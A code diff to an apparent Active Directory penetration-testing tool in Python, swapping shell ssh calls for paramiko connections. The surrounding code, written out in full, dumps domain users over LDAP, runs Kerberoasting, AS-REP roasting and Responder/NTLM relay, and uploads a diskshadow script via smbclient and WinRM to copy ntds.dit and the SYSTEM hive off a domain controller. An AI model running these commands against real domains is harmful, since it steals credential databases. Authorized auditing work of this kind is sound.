@@ -5,7 +5,72 @@ from pathlib import Path
 import yaml
 import time
 import re
+import paramiko
+from paramiko.config import SSHConfig
 
+# Cache for open connections
+_ssh_connections = {}  
+_sftp_connections = {}
+
+def run_ssh_command(hostname, command):
+    """Run command on host, maintaining persistent connection"""
+    if hostname not in _ssh_connections:
+        # Connect if not already connected
+        ssh_config = SSHConfig()
+        ssh_config_path = Path.home() / '.ssh' / 'config'
+        with open(ssh_config_path, 'r') as f:
+            ssh_config.parse(f)
+        
+        cfg = ssh_config.lookup(hostname)
+        
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(
+            hostname=cfg.get('hostname', hostname),
+            port=int(cfg.get('port', 22)),
+            username=cfg.get('user'),
+            key_filename=cfg.get('identityfile', [None])[0],
+            look_for_keys=False
+        )
+        _ssh_connections[hostname] = ssh
+    
+    # Run command on existing connection
+    stdin, stdout, stderr = _ssh_connections[hostname].exec_command(command)
+    output = stdout.read().decode().strip()
+    error = stderr.read().decode().strip()
+
+    return output, error
+
+def run_scp_command(hostname, remote_path, local_path, metode):
+    # Check if we have an existing connection
+    if hostname not in _ssh_connections:
+        run_ssh_command(hostname, "echo")  # This will create the connection
+    
+    if hostname not in _sftp_connections:
+        # Get the SFTP client from our existing connection
+        sftp = _ssh_connections[hostname].open_sftp()
+        _sftp_connections[hostname] = sftp
+    
+    try:
+        if metode == 'get':
+            _sftp_connections[hostname].get(remote_path, local_path)
+
+        if metode == 'put':
+            _sftp_connections[hostname].put(local_path, remote_path)
+    except Exception as e:
+        return f'SCP failed: {str(e)}'
+    
+
+def close_all_ssh_connections():
+    """Close all cached connections"""
+    for hostname, conn in _ssh_connections.items():
+        conn.close()
+    _ssh_connections.clear()
+
+    for hostname, conn in _sftp_connections.items():
+        conn.close()
+    _sftp_connections.clear()
+    
 class Color:
     GREEN = '\033[92m'
     YELLOW = '\033[93m'
@@ -74,18 +139,18 @@ def process_host(host_config):
     return scan_file
 
 
-def run_ssh_command(host, command):
-    try:
-        ssh_command = [
-            'ssh',
-            '-F', str(Path.home() / '.ssh/config'),
-            host,
-            command
-        ]
-        result = subprocess.run(ssh_command, capture_output=True, text=True)
-        return (True, result.stdout, result.stderr or "")
-    except subprocess.CalledProcessError as e:
-        return (False, e.stderr)
+# def run_ssh_command(host, command):
+#     try:
+#         ssh_command = [
+#             'ssh',
+#             '-F', str(Path.home() / '.ssh/config'),
+#             host,
+#             command
+#         ]
+#         result = subprocess.run(ssh_command, capture_output=True, text=True)
+#         return (True, result.stdout, result.stderr or "")
+#     except subprocess.CalledProcessError as e:
+#         return (False, e.stderr)
 
 def copy_files(file1, file2):
     try:
@@ -137,10 +202,10 @@ def validate_access(config):
             trial = run_ssh_command(host_name, requirements[tool]['cmd'])
 
             if tool == 'sudo_nopasswd':
-                if len(trial[1]) != 0:
+                if len(trial[0]) != 0:
                     wrong_stuff.append(tool)
             else:
-                if len(trial[1]) == 0:
+                if len(trial[0]) == 0:
                     wrong_stuff.append(tool)
 
         if wrong_stuff:
@@ -212,11 +277,11 @@ def checker(host):
     for targets in host['scans']:
         command = f'tail -n 1 segtest/{targets['scan_name']}*.xml'
         results = run_ssh_command(host['name'], command) 
-        print(results[1])
+        print(results[0])
         
 def en_users(jh, dc_ip, user, password, domain):
     ldapsearch = run_ssh_command(jh, 'command -v ldapsearch')
-    if len(ldapsearch[1]) == 0:
+    if len(ldapsearch[0]) == 0:
         print('The following tool is missing: ldapsearch')
         exit()
 
@@ -243,9 +308,10 @@ def en_users(jh, dc_ip, user, password, domain):
     command3 =  "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + """' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName description | awk 'BEGIN {FS="\\n"; RS=""; OFS=","}{user=""; desc="";for (i=1; i<=NF; i++){if ($i ~ /^sAMAccountName:/) user=substr($i, 17);if ($i ~ /^description:/) desc=substr($i, 13);}print user, desc}' > users-dump/users_descriptions"""
 
     en = run_ssh_command(jh, command1)
-    if len(en[2]) != 0:
-        print(en[2])
+    if len(en[1]) != 0 :
+        print(en[1])
         exit()
+
     print(color_text('Enabled users dumped.\n', Color.GREEN))
     en_adm = run_ssh_command(jh, command2)
     print(color_text('High privilege users gathered!\n', Color.GREEN))
@@ -255,14 +321,16 @@ def en_users(jh, dc_ip, user, password, domain):
     # create local directory
     create_local_dir = ['mkdir', f'users-dump']
     create = subprocess.run(create_local_dir, capture_output=True, text=True)
-    
-    copy_files(f'{jh}:~/users-dump/enabled_users', f'users-dump/enabled_users')
-    copy_files(f'{jh}:~/users-dump/high_priv_users', f'users-dump/high_priv_users')
-    copy_files(f'{jh}:~/users-dump/users_descriptions', f'users-dump/users_descriptions')
+
+    run_scp_command(jh, 'users-dump/enabled_users', f'users-dump/enabled_users', 'get')
+    run_scp_command(jh, 'users-dump/high_priv_users', f'users-dump/high_priv_users', 'get')
+    run_scp_command(jh, 'users-dump/users_descriptions', f'users-dump/users_descriptions', 'get')
+
 
 def roasting(jh, dc_ip, user, password, domain):
     netexec = run_ssh_command(jh, 'command -v netexec')
-    if len(netexec[1]) == 0:
+
+    if len(netexec[0]) == 0:
         print('The following tool is missing: netexec')
         exit()
 
@@ -282,8 +350,8 @@ def roasting(jh, dc_ip, user, password, domain):
     create_local_dir = ['mkdir', f'roasting']
     create = subprocess.run(create_local_dir, capture_output=True, text=True)
     
-    copy_files(f'{jh}:~/roasting/kerberoasted-users', f'roasting/kerberoasted-users')
-    copy_files(f'{jh}:~/roasting/asreproasted-users', f'roasting/asreproasted-users')
+    run_scp_command(jh, 'roasting/kerberoasted-users', 'roasting/kerberoasted-users', 'get')
+    run_scp_command(jh, 'roasting/asreproasted-users', 'roasting/asreproasted-users', 'get')
 
 
 def responder_run(jh, config_file=None):
@@ -295,13 +363,13 @@ def responder_run(jh, config_file=None):
         impacket = run_ssh_command(jh, 'command -v impacket-ntlmrelayx')
     
         missing_stuff = []    
-        if len(impacket[1]) == 0:
+        if len(impacket[0]) == 0:
             missing_stuff.append('impacket-ntlmrelayx')
-        if len(tmux[1]) == 0:
+        if len(tmux[0]) == 0:
             missing_stuff.append('tmux')
-        if len(responder[1]) == 0:
+        if len(responder[0]) == 0:
             missing_stuff.append('responder')
-        if len(netexec[1]) == 0:
+        if len(netexec[0]) == 0:
             missing_stuff.append('netexec')
 
         if missing_stuff : 
@@ -312,7 +380,8 @@ def responder_run(jh, config_file=None):
         # grab ethernet interface to listen on
         interface = run_ssh_command(jh, 'ip a')
         interfaces = []
-        for line in interface[1].split('\n'):
+        print(interface)
+        for line in interface[0].split('\n'):
             if_match = re.match(r'^\d+:\s+([^:]+):\s+<.*UP.*>', line)
             if if_match:
                 current_interface = if_match.group(1)
@@ -376,7 +445,7 @@ def responder_run(jh, config_file=None):
     
         interface = run_ssh_command(jh, 'ip a')
         interfaces = []
-        for line in interface[1].split('\n'):
+        for line in interface[0].split('\n'):
             if_match = re.match(r'^\d+:\s+([^:]+):\s+<.*UP.*>', line)
             if if_match:
                 current_interface = if_match.group(1)
@@ -434,13 +503,12 @@ echo 'copy z:\Windows\System32\config\SYSTEM C:\Windows\Temp\copy-system.hive' |
 diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
 '''
     netexec = run_ssh_command(jh, 'command -v nxc')
-    if len(netexec[1]) == 0:
+    if len(netexec[0]) == 0:
         print(color_text('\nThe following tool is missing: netexec\n',Color.RED))
-            # print('Tool error:\n', netexec[2])
         print(color_text("If nxc/netexec is actually installed/in path(this problem is usually cause by pipx netexec installs), then fix it by adding it in the global path with this:", Color.BOLD),"\n\necho 'export PATH=$PATH:~/.local/bin' >> ~/.zshenv  # For zsh \nor \necho 'export PATH=$PATH:~/.local/bin' >> ~/.profile # For bash")
         exit()
     smbclient = run_ssh_command(jh, 'command -v smbclient')
-    if len(smbclient[1]) == 0:
+    if len(smbclient[0]) == 0:
         print(color_text('\nThe following tool is missing: smbclient\n',Color.RED))
 
     with open(f'audit.ps1', 'w') as f:
@@ -450,13 +518,17 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
         if '@' in user:
             user = user.split('@')[0]
 
-        script = copy_files('audit.ps1', f'{jh}:~/audit.ps1')
+        script2 = run_scp_command(jh, 'audit.ps1', 'audit.ps1', 'put')
 
         print(color_text('\nUploading audit.ps1 file to the target.\n', Color.BOLD))
 
         command12 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'put audit.ps1 Windows/Temp/audit.ps1'"
 
         cp_audit = run_ssh_command(jh, command12)
+        if 'NT_STATUS_LOGON_FAILURE' in cp_audit[0]:
+            print(cp_audit[0])
+            exit()
+        
         time.sleep(1)
         
         command2 =  "nxc winrm "+dc_ip+" -u '"+user+"' -p '"+password+r"' -X 'C:\Windows\Temp\audit.ps1'"
@@ -469,7 +541,7 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
         run_audit = run_ssh_command(jh, command2)        
         if verbose:
             print(command2)
-            print(run_audit[1])
+            print(run_audit[0])
 
         command322 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'get Windows/Temp/copy-system.hive ntds-dump/copy-system.hive'"
         command333 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'get Windows/Temp/ntds.dit ntds-dump/ntds.dit'"
@@ -486,9 +558,10 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
         create = subprocess.run(create_local_dir, capture_output=True, text=True)
 
         print(color_text('Grabbing files over from jumphost...\n', Color.BOLD))
-        grab_audit1 = copy_files(f'{jh}:~/ntds-dump/ntds.dit', 'ntds/.')
-        grab_audit2 = copy_files(f'{jh}:~/ntds-dump/copy-system.hive', 'ntds/.')
-          
+        
+        grab_audit1 = run_scp_command(jh,'ntds-dump/ntds.dit', 'ntds/ntds.dit', 'get')
+        grab_audit2 = run_scp_command(jh, 'ntds-dump/copy-system.hive', 'ntds/copy-system.hive', 'get')
+
         print(color_text('Grabbing enabled users and high priv users. If fails only run users module.\n', Color.BOLD))
         users = en_users(jh, dc_ip, user, password, domain)
 
@@ -647,5 +720,7 @@ def main():
     if args.mode == 'parse' :
         print('Hello')
 
+    close_all_ssh_connections()
+    
 if __name__ == "__main__":
     main()
